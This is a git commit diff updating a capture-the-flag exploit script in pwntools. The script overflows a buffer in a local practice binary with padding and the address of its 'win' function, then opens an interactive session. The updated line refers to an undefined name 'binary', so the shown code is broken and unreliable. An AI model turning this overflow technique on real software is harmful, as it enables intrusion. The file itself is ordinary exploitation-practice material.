5daa87926843a76ad4c1ad0c8aec74d1027722e6
ajarmusch <61516473+ajarmusch@users.noreply.github.com>
2022-05-05 20:03:34 -0400

    Update 02.py

--- chall_02/02.py
+++ chall_02/02.py
@@ -1,6 +1,5 @@
 from pwn import *
-p=process("./withoutpie")
-p.recv()
-elf=ELF("./withoutpie")
+elf= context.binary = ELF("./withoutpie")
+p = process(binary.path)
 p.sendline((0x71+0x4)*b'A' + p32(elf.sym.win))
-p.recv()
+p.interactive()
